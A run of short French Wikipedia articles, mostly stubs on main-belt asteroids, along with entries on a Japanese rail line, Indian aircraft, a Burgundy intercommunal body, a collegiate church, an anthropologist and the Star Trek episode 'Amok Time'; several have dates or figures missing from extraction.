<doc id="10578600" url="https://fr.wikipedia.org/wiki?curid=10578600" title="(120741) Iijimayuichi">
(120741) Iijimayuichi

(120741) Iijimayuichi est un astéroïde de la ceinture principale.
Description.
(120741) Iijimayuichi est un astéroïde de la ceinture principale. Il fut découvert le à Chichibu par Naoto Satō. Il présente une orbite caractérisée par un demi-grand axe de 2,62 UA, une excentricité de 0,25 et une inclinaison de 4,8° par rapport à l'écliptique.

</doc>
<doc id="10578601" url="https://fr.wikipedia.org/wiki?curid=10578601" title="(126780) Ivovasiljev">
(126780) Ivovasiljev

(126780) Ivovasiljev est un astéroïde de la ceinture principale.
Description.
(126780) Ivovasiljev est un astéroïde de la ceinture principale. Il fut découvert le à l'Observatoire Kleť par le relevé KLENOT. Il présente une orbite caractérisée par un demi-grand axe de 3,06 UA, une excentricité de 0,11 et une inclinaison de 1,4° par rapport à l'écliptique.

</doc>
<doc id="10578602" url="https://fr.wikipedia.org/wiki?curid=10578602" title="(126888) Tspitzer">
(126888) Tspitzer

(126888) Tspitzer est un astéroïde de la ceinture principale.
Description.
(126888) Tspitzer est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,54 UA, une excentricité de 0,12 et une inclinaison de 8,0° par rapport à l'écliptique.

</doc>
<doc id="10578603" url="https://fr.wikipedia.org/wiki?curid=10578603" title="(129187) Danielalfred">
(129187) Danielalfred

(129187) Danielalfred est un astéroïde de la ceinture principale.
Description.
(129187) Danielalfred est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,60 UA, une excentricité de 0,13 et une inclinaison de 29,2° par rapport à l'écliptique.

</doc>
<doc id="10578604" url="https://fr.wikipedia.org/wiki?curid=10578604" title="(134134) Kristoferdrozd">
(134134) Kristoferdrozd

(134134) Kristoferdrozd est un astéroïde de la ceinture principale.
Description.
(134134) Kristoferdrozd est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 3,11 UA, une excentricité de 0,08 et une inclinaison de 6,7° par rapport à l'écliptique.

</doc>
<doc id="10578605" url="https://fr.wikipedia.org/wiki?curid=10578605" title="Semaine de l’unité islamique">
Semaine de l’unité islamique

La semaine de l’unité islamique a été décidée par Rouhollah Khomeini, en marge de la commémoration de la naissance du prophète Mahomet. La semaine allant du 12 de la lune Rabi-ol-Awwal, qui marque, selon la tradition sunnite, l’anniversaire de la naissance du prophète de l’Islam au 17 Rabia al awal, coïncidant, conformément aux traditions chiites, cet anniversaire, est baptisé, à l’initiative de Rouhollah Khomeini, par une idée de Hossein Ali Montazeri comme la semaine de l’unité.
Histoire.
Les musulmans chiites croient que le jour du mois de Rabia al awal dans le calendrier lunaire de Hijri marque l’anniversaire de naissance du prophète Mahomet, tandis que les musulmans sunnites considèrent le jour du mois comme l’anniversaire du dernier prophète. L’intervalle entre les deux dates est célébré chaque année comme la Semaine de l’unité islamique.
Dernier fondateur de la Révolution islamique, Rouhollah Khomeini a déclaré l’occasion comme la Semaine de l’unité islamique dans les années 1980.

</doc>
<doc id="10578607" url="https://fr.wikipedia.org/wiki?curid=10578607" title="(136432) Allenlunsford">
(136432) Allenlunsford

(136432) Allenlunsford est un astéroïde de la ceinture principale.
Description.
(136432) Allenlunsford est un astéroïde de la ceinture principale. Il fut découvert le aux monts Santa Catalina par le programme CSS. Il présente une orbite caractérisée par un demi-grand axe de 2,43 UA, une excentricité de 0,19 et une inclinaison de 3,8° par rapport à l'écliptique.

</doc>
<doc id="10578609" url="https://fr.wikipedia.org/wiki?curid=10578609" title="(157693) Amandamarty">
(157693) Amandamarty

(157693) Amandamarty est un astéroïde de la ceinture principale.
Description.
(157693) Amandamarty est un astéroïde de la ceinture principale. Il fut découvert le à Mayhill par Andrew Lowe. Il présente une orbite caractérisée par un demi-grand axe de 2,71 UA, une excentricité de 0,14 et une inclinaison de 7,6° par rapport à l'écliptique.

</doc>
<doc id="10578610" url="https://fr.wikipedia.org/wiki?curid=10578610" title="(175152) Marthafarkas">
(175152) Marthafarkas

(175152) Marthafarkas est un astéroïde de la ceinture principale.
Description.
(175152) Marthafarkas est un astéroïde de la ceinture principale. Il fut découvert le à Vail-Jarnac par Tom Glinos et David H. Levy. Il présente une orbite caractérisée par un demi-grand axe de 2,34 UA, une excentricité de 0,13 et une inclinaison de 6,3° par rapport à l'écliptique.

</doc>
<doc id="10578611" url="https://fr.wikipedia.org/wiki?curid=10578611" title="Jasmin Dizar">
Jasmin Dizar



</doc>
<doc id="10578613" url="https://fr.wikipedia.org/wiki?curid=10578613" title="(175730) Gramastetten">
(175730) Gramastetten

(175730) Gramastetten est un astéroïde de la ceinture principale.
Description.
(175730) Gramastetten est un astéroïde de la ceinture principale. Il fut découvert le à Linz par l'observatoire privé Meyer-Obermair. Il présente une orbite caractérisée par un demi-grand axe de 2,19 UA, une excentricité de 0,07 et une inclinaison de 1,2° par rapport à l'écliptique.

</doc>
<doc id="10578615" url="https://fr.wikipedia.org/wiki?curid=10578615" title="(176014) Vedrana">
(176014) Vedrana

(176014) Vedrana est un astéroïde de la ceinture principale.
Description.
(176014) Vedrana est un astéroïde de la ceinture principale. Il fut découvert le à Apache Point par Sloan Digital Sky Survey. Il présente une orbite caractérisée par un demi-grand axe de 3,09 UA, une excentricité de 0,25 et une inclinaison de 10,6° par rapport à l'écliptique.

</doc>
<doc id="10578616" url="https://fr.wikipedia.org/wiki?curid=10578616" title="(187531) Omorichugakkou">
(187531) Omorichugakkou

(187531) Omorichugakkou est un astéroïde de la ceinture principale.
Description.
(187531) Omorichugakkou est un astéroïde de la ceinture principale. Il fut découvert le à Nyukasa par Y. Sorimachi et Atsushi Nakajima. Il présente une orbite caractérisée par un demi-grand axe de 2,31 UA, une excentricité de 0,11 et une inclinaison de 5,7° par rapport à l'écliptique.

</doc>
<doc id="10578623" url="https://fr.wikipedia.org/wiki?curid=10578623" title="Attentat du 18 janvier 2017 à Gao">
Attentat du 18 janvier 2017 à Gao



</doc>
<doc id="10578642" url="https://fr.wikipedia.org/wiki?curid=10578642" title="Schwarze Wand">
Schwarze Wand

La est une montagne qui s’élève à d’altitude dans les Hohe Tauern, en Autriche.

</doc>
<doc id="10578646" url="https://fr.wikipedia.org/wiki?curid=10578646" title="Liste des sénateurs des États-Unis">
Liste des sénateurs des États-Unis



</doc>
<doc id="10578648" url="https://fr.wikipedia.org/wiki?curid=10578648" title="Ligne Kusatsu">
Ligne Kusatsu

La est une ligne ferroviaire du réseau West Japan Railway Company (JR West) dans les préfectures de Mie et Shiga au Japon. Elle relie la gare de Tsuge à la gare de Kusatsu.
La ligne Kusatsu constitue la ligne C du réseau urbain de la JR West dans l'agglomération d'Osaka-Kobe-Kyoto.
Histoire.
La ligne a été entièrement ouverte entre 1889 et 1890 par les chemins de fer du Kansai. La ligne est nationalisée en 1907.
Caractéristiques.
Services.
Tous les trains sont omnibus. Certains trains continuent à Kusatsu sur la ligne Biwako vers Kyoto aux heures de pointe du matin et du soir.

</doc>
<doc id="10578651" url="https://fr.wikipedia.org/wiki?curid=10578651" title="HAL Krishak">
HAL Krishak

Le HAL HAOP-27 Krishak est un avion d'observation indien conçu à la fin des années 1950. Sa mise en service est relativement tardive (1965, soit 6 ans après son premier vol) du fait de l'absence d'acheteurs dans un premier temps. Par la suite, l'armée de l'air indienne dut remplacer ses Auster AOP.6 et AOP.9 et acheta donc 70 Krishak. Il fut remplacé au milieu des années 1970 par le HAL Cheetah.

</doc>
<doc id="10578656" url="https://fr.wikipedia.org/wiki?curid=10578656" title="Communauté de communes Le Grand Charolais">
Communauté de communes Le Grand Charolais

La communauté de communes Le Grand Charolais est une communauté de communes française, située dans les départements de Saône-et-Loire, en région Bourgogne-Franche-Comté, et de l'Allier, en région Auvergne-Rhône-Alpes.
Historique.
La communauté de communes est créée le par la fusion des anciennes communautés de communes de Digoin Val de Loire, de Paray-le-Monial et du Charolais, avec extension à la commune du Rousset-Marizy en vertu d'un arrêté des préfets de l'Allier et de Saône-et-Loire en date des 13 et 16 décembre 2016.
Territoire communautaire.
Géographie.
La communauté de communes du Grand Charolais se situe dans l'ouest du département de Saône-et-Loire, et comprend également trois communes du département voisin de l'Allier (Chassenard, Coulanges et Molinet). Elle s'étend entre les vallées de la Bourbince, de l'Arconce et de la Loire, au cœur du Charolais. Ses territoires sont desservis par la RN 79, dite RCEA.
Composition.
La communauté de communes est composée des suivantes :
Administration.
Siège.
Le siège de la communauté de communes est situé provisoirement à Paray-le-Monial.
Les élus.
La communauté de communes est gérée par un conseil communautaire composé de 75 membres représentant chacune des communes membres et élus pour une durée de six ans.
Président et vice-présidents.
Le premier conseil communautaire du 17 janvier 2017 a élu son président ainsi que quinze vice-présidents.
Compétences.
L'intercommunalité exerce des compétences qui lui sont déléguées par les communes membres, exercées auparavant par les anciennes communautés de communes. Elles concernent 4 domaines principaux :
L'aménagement du territoire.
En matière d'urbanisme la communauté a la charge du plan d'urbanisme intercommunal et l'aménagement de l'espace. Sa compétence porte également sur les voiries intercommunautaires.
Développement économique.
Cette compétence recouvre les parcs d'activité industrielle et commerciale, la promotion du tourisme, les voies vertes et de randonnées.
Environnement.
Les différents domaines concernés sont la collecte et le traitement des déchets des ménages, la gestion des milieux aquatiques, le contrôle de l'assainissement non collectif.
Services à la population.
Ces services recouvrent l'action sociale d'intérêt communautaire, la politique de logement, les maisons de santé pluridisciplinaires, les équipements culturels et sportifs. 
Pays Charolais Brionnais.
La Communauté de communes appartient au syndicat mixte Pays Charolais Brionnais qui intervient en particulier par le biais d un Contrat de Pays permettant de soutenir les porteurs de projet du territoire, des actions de développement culturel, touristique et patrimonial, et par le Schéma de cohérence territoriale.
Régime fiscal et budget.
Le budget de la communauté de communes est composé du budget principal et de huit budgets annexes : déchets ménagers, spanc, maison de santé de l'Arconce, office de tourisme, port de plaisance, Barberèche, Zac des Mûriers, Ligerval. Ensemble leur montant est de 36 880 930,64 € en fonctionnement 10 836 558,61 € en investissements pour l'année 2019.

</doc>
<doc id="10578658" url="https://fr.wikipedia.org/wiki?curid=10578658" title="Jardin Juan-Miro">
Jardin Juan-Miro



</doc>
<doc id="10578665" url="https://fr.wikipedia.org/wiki?curid=10578665" title="Albano-Américains">
Albano-Américains

Les Albano-Américains (ou "Shqiptaro-Amerikanët" en albanais) sont les Américains d'origine albanaise. 
Démographie.
Ils sont particulièrement présents dans l'État de New York (), dans le Michigan (), dans le Massachusetts (), dans le New Jersey (), dans le Connecticut (), en Pennsylvanie () et en Floride ().

</doc>
<doc id="10578669" url="https://fr.wikipedia.org/wiki?curid=10578669" title="Daniel Domaszewski">
Daniel Domaszewski

Daniel Domaszewski, né le , est un pilote argentin de rallye-raid, en quad.

</doc>
<doc id="10578670" url="https://fr.wikipedia.org/wiki?curid=10578670" title="Coupe de Russie de football 2016-2017">
Coupe de Russie de football 2016-2017

La Coupe de Russie 2016-2017 est la édition de la Coupe de Russie depuis la dissolution de l'URSS. Elle prend place du au .
Le vainqueur de la coupe se qualifie pour la phase de groupes de la Ligue Europa 2017-2018. Elle est remportée par le Lokomotiv Moscou qui bat en finale l'Oural Iekaterinbourg sur le score de 2-0, le  au stade olympique Ficht.
Résultats.
Quatrième tour.
Les clubs de deuxième division font leur entrée dans la compétition à ce tour.
Seizièmes de finale.
Les clubs de première division font leur entrée dans la compétition à ce tour.

</doc>
<doc id="10578673" url="https://fr.wikipedia.org/wiki?curid=10578673" title="(227152) Zupi">
(227152) Zupi

 est un astéroïde de la ceinture principale.
Description.
 est un astéroïde de la ceinture principale. Il fut découvert le à Vallemare Borbona par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,38 UA, une excentricité de 0,20 et une inclinaison de 3,8° par rapport à l'écliptique.
Il a été nommé (227152) Shujinakamura avant que la dénomination ne soit abrogée.

</doc>
<doc id="10578674" url="https://fr.wikipedia.org/wiki?curid=10578674" title="(239716) Felixbaumgartner">
(239716) Felixbaumgartner

(239716) Felixbaumgartner est un astéroïde de la ceinture principale.
Description.
(239716) Felixbaumgartner est un astéroïde de la ceinture principale. Il fut découvert le à Gaisberg par Richard Gierlinger. Il présente une orbite caractérisée par un demi-grand axe de 2,72 UA, une excentricité de 0,11 et une inclinaison de 5,0° par rapport à l'écliptique.

</doc>
<doc id="10578675" url="https://fr.wikipedia.org/wiki?curid=10578675" title="(246821) Satyarthi">
(246821) Satyarthi

(246821) Satyarthi est un astéroïde de la ceinture principale.
Description.
(246821) Satyarthi est un astéroïde de la ceinture principale. Il fut découvert le à Vallemare Borbona par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 3,08 UA, une excentricité de 0,14 et une inclinaison de 5,2° par rapport à l'écliptique.

</doc>
<doc id="10578677" url="https://fr.wikipedia.org/wiki?curid=10578677" title="(255598) Paullauterbur">
(255598) Paullauterbur

(255598) Paullauterbur est un astéroïde de la ceinture principale.
Description.
(255598) Paullauterbur est un astéroïde de la ceinture principale. Il fut découvert le à Vallemare Borbona par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 2,37 UA, une excentricité de 0,20 et une inclinaison de 7,4° par rapport à l'écliptique.

</doc>
<doc id="10578679" url="https://fr.wikipedia.org/wiki?curid=10578679" title="(276568) Joestübler">
(276568) Joestübler

(276568) Joestübler est un astéroïde de la ceinture principale.
Description.
(276568) Joestübler est un astéroïde de la ceinture principale. Il fut découvert le à Linz par l'observatoire privé Meyer-Obermair. Il présente une orbite caractérisée par un demi-grand axe de 3,08 UA, une excentricité de 0,14 et une inclinaison de 7,0° par rapport à l'écliptique.

</doc>
<doc id="10578680" url="https://fr.wikipedia.org/wiki?curid=10578680" title="(284029) Esplugafrancolí">
(284029) Esplugafrancolí

 est un astéroïde de la ceinture principale.
Description.
 est un astéroïde de la ceinture principale. Il fut découvert le à Begues par José Manteca. Il présente une orbite caractérisée par un demi-grand axe de 3,09 UA, une excentricité de 0,09 et une inclinaison de 11,0° par rapport à l'écliptique.

</doc>
<doc id="10578682" url="https://fr.wikipedia.org/wiki?curid=10578682" title="(292872) Anoushankar">
(292872) Anoushankar

(292872) Anoushankar est un astéroïde de la ceinture principale.
Description.
(292872) Anoushankar est un astéroïde de la ceinture principale. Il fut découvert le à Vallemare Borbona par Vincenzo Silvano Casulli. Il présente une orbite caractérisée par un demi-grand axe de 3,06 UA, une excentricité de 0,12 et une inclinaison de 9,0° par rapport à l'écliptique.

</doc>
<doc id="10578684" url="https://fr.wikipedia.org/wiki?curid=10578684" title="(352860) Monflier">
(352860) Monflier

(352860) Monflier est un astéroïde de la ceinture principale.
Description.
(352860) Monflier est un astéroïde de la ceinture principale. Il fut découvert le à Vicques par Michel Ory. Il présente une orbite caractérisée par un demi-grand axe de 2,31 UA, une excentricité de 0,23 et une inclinaison de 3,0° par rapport à l'écliptique.

</doc>
<doc id="10578685" url="https://fr.wikipedia.org/wiki?curid=10578685" title="(391257) Wilwheaton">
(391257) Wilwheaton

(391257) Wilwheaton est un astéroïde de la ceinture principale.
Désignation et nom.
Lors de sa découverte, cet astéroïde reçut la désignation provisoire . , il reçut sa numérotation définitive, (391257). , l'astéroïde reçut enfin le nom Wilwheaton, d'après l'acteur Wil Wheaton, qui a joué le personnage de Wesley Crusher dans la série "".
Description.
(391257) Wilwheaton est un astéroïde de la ceinture principale d'astéroïdes. Il fut découvert le à Uccle par Thierry Pauwels. Il présente une orbite caractérisée par un demi-grand axe de 2,64 UA, une excentricité de 0,30 et une inclinaison de 10,9° par rapport à l'écliptique.

</doc>
<doc id="10578686" url="https://fr.wikipedia.org/wiki?curid=10578686" title="(398045) Vitudurum">
(398045) Vitudurum

(398045) Vitudurum est un astéroïde de la ceinture principale.
Description.
(398045) Vitudurum est un astéroïde de la ceinture principale. Il fut découvert le à Winterthour par Markus Griesser. Il présente une orbite caractérisée par un demi-grand axe de 2,81 UA, une excentricité de 0,12 et une inclinaison de 14,9° par rapport à l'écliptique.

</doc>
<doc id="10578688" url="https://fr.wikipedia.org/wiki?curid=10578688" title="(418891) Vizi">
(418891) Vizi

(418891) Vizi est un astéroïde de la ceinture principale.
Description.
(418891) Vizi est un astéroïde de la ceinture principale. Il fut découvert le à l'observatoire Piszkéstető par Krisztián Sárneczky. Il présente une orbite caractérisée par un demi-grand axe de 3,15 UA, une excentricité de 0,21 et une inclinaison de 17,4° par rapport à l'écliptique.

</doc>
<doc id="10578692" url="https://fr.wikipedia.org/wiki?curid=10578692" title="(429084) Dietrichrex">
(429084) Dietrichrex

(429084) Dietrichrex est un astéroïde de la ceinture principale.
Description.
(429084) Dietrichrex est un astéroïde de la ceinture principale. Il fut découvert le à ESA OGS par Matthias Busch et Rainer Kresken. Il présente une orbite caractérisée par un demi-grand axe de 2,62 UA, une excentricité de 0,12 et une inclinaison de 14,5° par rapport à l'écliptique.

</doc>
<doc id="10578703" url="https://fr.wikipedia.org/wiki?curid=10578703" title="Tourbet Kabira Mamiyya">
Tourbet Kabira Mamiyya

Le tourbet Kabira Mamiyya est un mausolée tunisien situé à Tunis, sur la colline surplombant le cimetière du Djellaz, non loin du mausolée Sidi Belhassen Chedly.
Histoire.
Le mausolée est construit au cours des années 1740 par Ali Pacha. Il est à l'origine destiné à abriter la sépulture de ce dernier, mais il l'affecte aux femmes de sa famille après l'édification d'un second mausolée (Tourbet El Pacha) accolé à la médersa El Bachia.
Le mausolée porte le nom de son épouse préférée, Kabira Mamiyya.

</doc>
<doc id="10578715" url="https://fr.wikipedia.org/wiki?curid=10578715" title="Première Guerre balkanique">
Première Guerre balkanique



</doc>
<doc id="10578717" url="https://fr.wikipedia.org/wiki?curid=10578717" title="HAL HJT-16 Kiran">
HAL HJT-16 Kiran

Le HAL HJT-16 Kiran est un avion d'entraînement à turboréaction indien des années 1960 (premier vol en 1964 et mise en service en 1968). Un total de 251 exemplaires sont produits de 1968 à 1989 et il est encore en service en 2023 dans l'armée de l'air ou la Marine indienne. Un minimum de 63 incidents et accidents dont 20 mortels sont répertoriés entre 1974 et le 1er juin 2023

</doc>
<doc id="10578723" url="https://fr.wikipedia.org/wiki?curid=10578723" title="Francine Ducrot-Icard">
Francine Ducrot-Icard

Francine Ducrot-Icard, née le à Pont-de-Vaux, sur la commune de Marly-sous-Issy (Saône-et-Loire) et morte à Saint-Germain-en-Laye (Seine-et-Oise) le , est une sculptrice française. Elle est mariée au sculpteur Honoré Icard.
Biographie.
Françoise Clémence, dite Francine Ducrot, est née le à Pont-de-Vaux, sur la commune de Marly-sous-Issy, aux confins de la Nièvre et de la Saône-et-Loire. Elle est la fille d'un couple de maîtres de forge, Claude Ducrot et Marie-Antoinette Lafouge. 
Francine Ducrot est l'élève de Henri Louis Levasseur, Charles Valton et Alfred Boucher.
Institutrice, elle expose au Salon des artistes français, remportant une mention honorable en 1894, une médaille de troisième classe dans la même année et une mention honorable à l'Exposition Universelle en 1900.
Honoré Icard, alors âgé de 49 ans, l'épouse à Villers-sur-Mer le .
Elle meurt le , quelques jours avant le décès de son mari, à Saint-Germain-en-Laye. 

</doc>
<doc id="10578730" url="https://fr.wikipedia.org/wiki?curid=10578730" title="Deuxième Guerre balkanique">
Deuxième Guerre balkanique



</doc>
<doc id="10578736" url="https://fr.wikipedia.org/wiki?curid=10578736" title="Collégiale Notre-Dame-de-l'Assomption de Longpré-les-Corps-Saints">
Collégiale Notre-Dame-de-l'Assomption de Longpré-les-Corps-Saints

La collégiale Notre-Dame-de-l'Assomption de Longpré-les-Corps-Saints est une ancienne collégiale située dans le centre du bourg de Longpré-les-Corps-Saints, dans le département de la Somme, entre Abbeville et Amiens, dans la vallée de la Somme.
Historique.
L'histoire de la collégiale est liée aux croisades en particulier la quatrième qui devait conduire les croisés prendre Constantinople. Le , Vibert, chapelain d’Aléaume de Fontaines, de retour de croisade arrive à Longpré porteur de précieuses reliques qui donnèrent le qualificatif de « Corps-Saints » au bourg de Longpré. Une collégiale est fondée pour y conserver les reliques : douze chanoines et cinq chapelains auxquels s'ajoutèrent les deux curés de Longpré et de Wanel. Les papes Innocent III et Grégoire IX accordèrent leur protection à la collégiale qui devint dès lors un important lieu de pèlerinage.
La collégiale subit d'importants dégâts au cours de la guerre de Cent Ans, en 1437, le pape Eugène IV accorda des indulgences aux fidèles qui feraient des aumônes pour la réparation du monument. En 1505, l'évêque d'Amiens consacra la collégiale restaurée. Mais peu à peu le rayonnement de la collégiale décline et à la Révolution française, le chapitre canonial est supprimé.
L'église actuelle, édifiée de cette crypte, est la troisième depuis celle du . Elle remplace celle du XVIIe incendiée en .
Le portail et le clocher sont protégés au titre des monuments historiques : classement par arrêté du . Au début de la Seconde Guerre mondiale, pendant la bataille de France de 1940, le bourg de Longpré fut détruit à 90 %, la flèche de l'église fut détruite.
Description.
Portail.
Le portail de l'église est de style gothique, classé monument historique en 1908, il a gardé une partie de son décor sculpté mais aujourd'hui est très abimé.
Crypte romane.
Édifiée en 1190, elle conserve la pierre tombale d'Aléaume de Fontaine, seigneur de Longpré, fondateur de la collégiale. Un certain nombre de reliques y sont conservées ainsi qu'une mise au tombeau du XVIe siècle et des sépultures de seigneurs de Longpré.
Trésor.
La collégiale conserve un certain nombre d'objets protégés en tant que monuments historiques, au titre d'objets :

</doc>
<doc id="10578742" url="https://fr.wikipedia.org/wiki?curid=10578742" title="Malice de Porportuk">
Malice de Porportuk

Malice de Porportuk (titre original : ) est une nouvelle du Nord canadien de l'écrivain américain Jack London, publié aux États-Unis en 1910. En France, elle a paru pour la première fois en 1926.
Historique.
La nouvelle est publiée initialement dans "The Times Magazine" en , avant d'être reprise dans le recueil "Lost Face" en .
Résumé.
Porportuk, le vieil usurier, a bien gagné aux enchères la jeune El-Soo, mais celle-ci s'est enfuie avec son amoureux. Courir après un chien qui ne cesse de s'enfuir de chez son propriétaire ne l'amuse plus. Il va laisser libre cours à sa malice pour l'empêcher de s'enfuir à nouveau...

</doc>
<doc id="10578743" url="https://fr.wikipedia.org/wiki?curid=10578743" title="Riebeek Kasteel">
Riebeek Kasteel



</doc>
<doc id="10578744" url="https://fr.wikipedia.org/wiki?curid=10578744" title="Alisse Waterston">
Alisse Waterston

Alisse Waterston (née en 1951) est une professeure américaine d'anthropologie au John Jay College of criminal Justice, de l'université de la ville de New York. Son travail se concentre sur la façon donc la violence systémique et l'inégalité influencent la société.
Jeunesse et éducation.
Alisse Waterston a obtenu son baccalauréat en psychologie expérimentale et de l'éducation à l'université de New York. Elle a ensuite poursuivi ses études et obtenu son master à l'université Columbia, où elle s'est concentrée sur l'anthropologie culturelle, avec une thèse intitulée '. Elle a poursuivi par des études de doctorat à l'école doctorale de l'université de la Ville de New York en 1990. Sa thèse, ', a été publiée cette année-là.
Carrière.
Alisse Waterston a servi comme instructrice adjointe de 1981 à 1985 à l'université Pace à White Plains et Pleasantville, New York, dans le département d'anthropologie et de sociologie. En 1991 et 1992, elle a été professeure adjointe à l'université d'État de New York, dans la Division des Sciences Sociales. Elle a ensuite été engagée pour un an en tant que professeure adjointe à l'université Fordham, dans le département d'anthropologie et de sociologie.
Avec sa sœur Adriana, en 1992, Waterston a co-fondé Surveys Unlimited, une division de Horowitz Associates dédiée à recherche sur la vie sociale, culturelle et ethnique pour les marchés urbains. Elle a servi en tant que président de sa fondation jusqu'en 2003. Durant ce temps, elle a été professeure associée à la New School for Social Research de 1996 à 1998 à la faculté des études supérieures en sociologie à New York. En 1998, Waterston a reçu le Prix d'Excellence en Recherche NAMIC. Elle a travaillé comme rédacteur en chef du North American Dialogue (publication de la Société d'Anthropologie de l'Amérique du Nord) pour six ans.
En 2003, Alisse Waterston est devenue professeure associée au John Jay College of criminal Justice du département associé d'anthropologie.
En 2005, ellee a servi en tant que directrice de la Chaire du Programme de réunion annuelle de l'American Anthropological Association.
En 2006, elle a été nommée présidente de la nouvelle American Anthropological Association conseil sur l'Avenir de l'Électronique et de l'Édition imprimée, un comité pour superviser le AAA de la transition à l'édition numérique avec AnthroSource. En 2015, elle sert en tant que Présidente.
En 2009, elle est devenue professeure titulaire au John Jay College of criminal Justice.
En 2013, elle a publié de son père dans un livre intitulé "de My father's wars" (Routledge). Elle est la présidente-élue de l'American Anthropological Association, à titre de vice-présidente (2014-2015) et présidente en 2016-2017. Elle est membre du conseil d'administration du John Jay College Foundation, Inc.

</doc>
<doc id="10578746" url="https://fr.wikipedia.org/wiki?curid=10578746" title="Première Guerre macédonienne">
Première Guerre macédonienne



</doc>
<doc id="10578761" url="https://fr.wikipedia.org/wiki?curid=10578761" title="Francine Ducrot">
Francine Ducrot



</doc>
<doc id="10578765" url="https://fr.wikipedia.org/wiki?curid=10578765" title="Le Mal du pays (Star Trek)">
Le Mal du pays (Star Trek)

Le Mal du pays ("Amok Time") est le premier épisode de la deuxième saison de la série télévisée "Star Trek". Il fut diffusé pour la première fois le sur la chaîne NBC.
C'est la première apparition de Pavel Chekov. Le premier officier Spock doit impérativement rentrer sur Vulcain, sa planète natale afin de participer à une cérémonie de mariage au rituel violent. Invité à la cérémonie, le capitaine Kirk est amené à combattre Spock.
Résumé.
À bord de l', le Docteur McCoy semble trouver que Spock se comporte d'une façon inhabituelle : le vulcain, habituellement calme et logique apparaît nerveux et irritable. Celui-ci demande un congé pour rejoindre sa planète natale mais il lui est refusé car le vaisseau doit représenter Starfleet à la soirée inaugurant la présidence d'Altair VI.
Toutefois le comportement de Spock devient inquiétant et McCoy découvre qu'il fait une poussée d'hormones qui pourraient le tuer en quelques jours. Spock est forcé d'expliquer qu'il est dans la période du pon farr, un moment crucial dans la vie des vulcains où ceux-ci doivent se marier à la femme qui leur est promise. Désobéissant à Starfleet, le capitaine Kirk décide de changer la trajectoire du vaisseau pour le diriger vers Vulcain. Reconnaissant, Spock invite Kirk et McCoy à sa cérémonie de mariage.
La cérémonie est présidée par T'Pau, la matriarche de la famille de Spock et seule personne à avoir refusé un siège à la fédération. Elle accepte la présence des humains tandis que la promise de Spock, T'Pring, est accompagnée de Stonn, un vulcain. Avant la cérémonie, T'Pring demande un "koon-ut-kal-if-fee", un combat entre Spock et un champion désigné par elle. Elle choisit Kirk qui accepte peu de temps avant de savoir qu'il s'agit d'un combat à mort.
Au cours du combat, Spock réussit à blesser le capitaine Kirk avec un lirpa, une épée traditionnelle. McCoy soigne brièvement Kirk estimant le combat déséquilibré à cause de l'atmosphère de vulcain. Le duel reprend, Spock finit par tuer Kirk en le garrotant avec une corde vulcain, le Ahn'woon. McCoy récupère le corps de Kirk et se téléporte avec lui à bord de l'Enterprise. Spock reprend ses esprits et s'en veut d'avoir tué son ami. Il explique qu'il va se livrer de lui-même à la fédération qui le punira d'avoir tué son supérieur hiérarchique. T'Pring lui avoue alors que tout cela avait été manigancé par elle. Elle est amoureuse de Stonn et lui faire affronter Kirk était le seul choix logique pour échapper au mariage arrangé étant donné que quelle qu'en soit l'issue, elle serait libre.
À son retour dans le vaisseau, Spock apprend que Kirk avait simulé sa mort avec l'aide d'un produit fourni par McCoy. Grâce à l'influence de T'Pau, aucune charge n'est retenue contre Kirk pour son retard.
Production.
Écriture.
L'épisode fut écrit par l'auteur de science fiction Theodore Sturgeon qui avait auparavant rédigé le scénario de l'épisode "Une partie de campagne". L'épisode fut suggéré par le producteur exécutif de la série Gene Roddenberry en . L'épisode était prévu pour la première saison car NBC savait que le personnage de Spock était devenu très populaire. Toutefois, connaissant la vitesse d'écriture de Sturgeon, la production le repoussa à la saison 2 espérant en faire une bonne introduction pour la nouvelle saison.
Dans le script original, T'Pau n'intercédait plus en faveur de Kirk à la fin de l'épisode, le combat devait se faire sans arme et la planète Altair VI se nommait « Fontana VI » en l'honneur de la scénariste D. C. Fontana. De plus, elle contenait bien plus de terme de vocabulaire vulcain inventé pour l'occasion. Le script final de Sturgeon fut terminé le . Au cours des différentes réécritures au cours du mois de juin, le producteur fit changer le nom de Spor en Stonn estimant que son nom originel trop « freudien ».
Casting.
Peu de temps avant le début de la deuxième saison, l'acteur Leonard Nimoy semblait vouloir ne pas reprendre son rôle de Spock estimant son salaire trop faible. La production approcha donc l'acteur Lawrence Montaigne qui avait déjà joué le rôle de Decius dans l'épisode "Zone de terreur" pour qu'il le remplace si Nimoy refusait de venir. L'acteur ayant trouvé un accord, il fut offert le rôle de Stonn à Montaigne.
L'actrice Arlene Martel avait déjà été auditionnée pour les rôles du docteur Elizabeth Dehner dans l'épisode "Où l'homme dépasse l'homme" mais refusa car elle ne voulait pas porter de lentilles de contact. Elle auditionna pour le rôle de Sylvia dans l'épisode "Dans les griffes du chat" mais la production estima qu'elle était idéale pour le rôle de T'Pring.
Tournage.
Le tournage eut lieu du 9 au dans les studios de la compagnie Desilu Productions sur Gower Street à Hollywood sous la direction de Joseph Pevney.
Selon Leonard Nimoy, Celia Lovsky n'arrivait pas à faire le salut vulcain naturellement. La caméra fut placée de sorte qu'on ne voie pas ce détail. Le , Mary Rice fut photographiée afin de servir d'image à la jeune T'Pring. Toutefois, les prothèses d'oreilles de vulcains n'étant pas adaptées aux oreilles d'enfant, elle posa de profil.
Les décors ont été agrandis lors de cette nouvelle saison, ainsi l'infirmerie est plus grande, incluant un bureau pour le docteur McCoy et d'autre lits. On peut voir aussi les quartiers de Spock en entier. On peut apercevoir les mêmes casques que les romuliens de "Zone de terreur" sur certains gardes participants du pon farr.
Musique et post-production.
